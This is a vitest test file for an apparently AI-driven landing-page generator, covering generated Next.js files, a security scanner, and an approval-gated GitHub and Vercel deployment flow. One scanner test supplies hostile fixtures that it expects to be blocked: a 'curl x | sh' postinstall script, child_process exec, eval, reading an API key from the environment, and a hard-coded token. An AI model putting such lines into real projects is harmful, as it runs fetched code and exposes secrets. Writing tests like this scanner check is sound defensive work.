import { afterEach, describe, expect, it } from "vitest";
import { setAdapterFactory } from "@/ai/engine";
import { decideApproval, listApprovals } from "@/core/policy";
import { saveOwner } from "@/core/settings";
import * as dev from "@/build/developer";
import { generateLandingProject } from "@/build/landing";
import { setSandboxFactory, type Sandbox } from "@/build/sandbox";
import { scanProject } from "@/build/scan";
import { githubConnectToken } from "@/integrations/github";
import { vercelConnectToken } from "@/integrations/vercel";
import { connectFakeAi } from "./fakes/ai";
import { World } from "./fakes/world";
import { sampleContent, sampleSpec, testCtx } from "./helpers";

afterEach(() => {
  setAdapterFactory(null);
  setSandboxFactory(null);
});

function fakeSandbox(results: Record<string, number> = {}, written: string[][] = []): () => Promise<Sandbox> {
  return async () => ({
    kind: "local",
    writeFiles: async (files) => void written.push(files.map((f) => f.path)),
    run: async (_cmd, args) => {
      const name = args[0] === "install" ? "install" : args[0] === "run" ? args[1]! : "test";
      return { exitCode: results[name] ?? 0, stdout: `${name} ok`, stderr: results[name] ? `${name} failed: Type error in components/Landing.tsx` : "", durationMs: 5, timedOut: false };
    },
    readFile: async () => null,
    stop: async () => undefined,
  });
}

describe("landing page generator & security scan", () => {
  it("generates a complete, accessible, SEO-ready Next.js project", () => {
    const files = generateLandingProject(sampleSpec(), { en: sampleContent() });
    const paths = files.map((f) => f.path);
    for (const p of ["package.json", "app/layout.tsx", "app/page.tsx", "app/api/lead/route.ts", "app/sitemap.ts", "app/robots.ts", "app/privacy/page.tsx", "components/LeadForm.tsx", "tests/site.test.mjs", "app/globals.css"]) expect(paths).toContain(p);
    const form = files.find((f) => f.path === "components/LeadForm.tsx")!.content as string;
    expect(form).toContain("htmlFor");
    expect(form).toContain('autoComplete');
    const css = files.find((f) => f.path === "app/globals.css")!.content as string;
    expect(css).toContain("prefers-reduced-motion");
    expect(scanProject(files).filter((f) => f.severity === "block")).toEqual([]);
  });

  it("builds per-locale routes with RTL support", () => {
    const files = generateLandingProject(sampleSpec({ locales: ["ru", "ar"] }), { ru: sampleContent(), ar: sampleContent() });
    expect(files.map((f) => f.path)).toContain("app/[locale]/page.tsx");
    expect(files.find((f) => f.path === "content/site.ts")!.content).toContain('"ar": true');
  });

  it("blocks unapproved dependencies, dynamic code, secret access and hard-coded keys", () => {
    const findings = scanProject([
      { path: "package.json", content: JSON.stringify({ dependencies: { next: "16", "left-pad-evil": "1.0.0" }, scripts: { postinstall: "curl x | sh" } }) },
      { path: "app/x.ts", content: 'import { exec } from "child_process"; eval("1"); const k = process.env.ANTHROPIC_API_KEY; const t = "ghp_abcdefghijklmnopqrstuvwxyz0123";' },
    ]);
    const rules = findings.map((f) => f.rule);
    for (const r of ["dependency-allowlist", "install-script", "script", "process", "dynamic-code", "env", "secret"]) expect(rules).toContain(r);
  });
});

describe("BINGO DEVELOPER end to end (acceptance test 1)", () => {
  it("“Create a premium SleepTime landing page” → copy → code → sandbox checks → GitHub PR → Vercel preview URL → production only after approval", async () => {
    const world = new World();
    const ctx = testCtx(world.fetch);
    await connectFakeAi(ctx);
    await saveOwner(ctx, { email: "owner@carpediem.example", preferredLanguage: "en" });
    await githubConnectToken(ctx, "gho_test");
    await vercelConnectToken(ctx, "vercel_test");
    const written: string[][] = [];
    setSandboxFactory(fakeSandbox({}, written));

    let p = await dev.planProject(ctx, { request: "Create a premium SleepTime landing page", workspaceId: "ws_carpediem" });
    expect(p.productId).toBe("prod_sleeptime");
    expect(p.notes.join(" ")).toMatch(/no approved claims/);
    p = await dev.writeContent(ctx, p.id);
    expect(p.content.en!.hero.headline).toBeTruthy();
    p = await dev.generateFiles(ctx, p.id);
    p = await dev.runChecks(ctx, p.id);
    expect(p.checks.at(-1)!.ok).toBe(true);
    expect(written[0]).toContain("app/page.tsx");
    p = await dev.publishToGithub(ctx, p.id);
    expect(p.repo?.prUrl).toMatch(/github.com\/aaryansatyam4\/carpediem-sleeptime-product\/pull\/1/);
    const repo = world.repos.get("aaryansatyam4/carpediem-sleeptime-product")!;
    expect(repo.refs.get("bingo/r1")).toBe(p.repo?.commitSha);

    p = await dev.deployPreview(ctx, p.id);
    const preview = p.deployments[0]!;
    expect(preview.target).toBe("preview");
    // Vercel received only content-addressed files, and the lead secret went in as an encrypted env var.
    const proj = [...world.vercelProjects.values()][0]!;
    expect(JSON.stringify(proj.env)).toContain("LEAD_SIGNING_SECRET");
    expect(world.deployments.get(preview.id)!.target).toBeUndefined();
    let poll = await dev.pollDeployment(ctx, p.id, preview.id);
    expect(poll.state).toBe("pending");
    poll = await dev.pollDeployment(ctx, p.id, preview.id);
    expect(poll.state).toBe("ready");
    expect(poll.project.status).toBe("preview_ready");
    expect(poll.project.deployments[0]!.verified?.ok).toBe(true);
    expect(poll.project.deployments[0]!.url).toMatch(/^https:\/\/.*\.vercel\.app$/);

    // Production requires approval; nothing is deployed before it.
    const req = await dev.requestProduction(ctx, p.id);
    expect(req.status).toBe("awaiting_approval");
    expect([...world.deployments.values()].filter((d) => d.target === "production")).toHaveLength(0);
    const [approval] = await listApprovals(ctx);
    expect(approval!.kind).toBe("deploy.production");
    await decideApproval(ctx, approval!.id, "approved", "test");
    const go = await dev.requestProduction(ctx, p.id, { approvalId: approval!.id });
    expect(go.status).toBe("deploying");
    const prodId = go.project.deployments.at(-1)!.id;
    await dev.pollDeployment(ctx, p.id, prodId);
    const live = await dev.pollDeployment(ctx, p.id, prodId);
    expect(live.project.status).toBe("live");
    expect(live.project.liveUrl).toMatch(/vercel\.app/);
    // Same files that were approved went to production.
    expect(world.deployments.get(prodId)!.files).toEqual(world.deployments.get(preview.id)!.files);
  });

  it("refuses to preview code that failed checks and records the failure", async () => {
    const world = new World();
    const ctx = testCtx(world.fetch);
    await connectFakeAi(ctx, {}, ["openai"]); // no coding model → no auto repair
    await connectFakeAi(ctx, {}, ["anthropic"]);
    await saveOwner(ctx, { preferredLanguage: "en" });
    setSandboxFactory(fakeSandbox({ typecheck: 1 }));
    let p = await dev.planProject(ctx, { request: "landing page for HappyGut 140B", workspaceId: "ws_carpediem" });
    p = await dev.writeContent(ctx, p.id);
    p = await dev.generateFiles(ctx, p.id);
    p = await dev.runChecks(ctx, p.id, { repairAttempts: 1 });
    expect(p.status).toBe("checks_failed");
    expect(p.repairs.length).toBe(0); // repair ran but the fake fix changed nothing → no new revision
    await expect(dev.deployPreview(ctx, p.id)).rejects.toThrow(/Checks must pass/);
  });

  it("never overwrites an existing repository", async () => {
    const world = new World();
    const ctx = testCtx(world.fetch);
    await githubConnectToken(ctx, "gho_test");
    const { createRepo } = await import("@/integrations/github");
    await createRepo(ctx, { name: "site", description: "", private: true });
    await expect(createRepo(ctx, { name: "site", description: "", private: true })).rejects.toThrow(/will not overwrite/);
  });
});
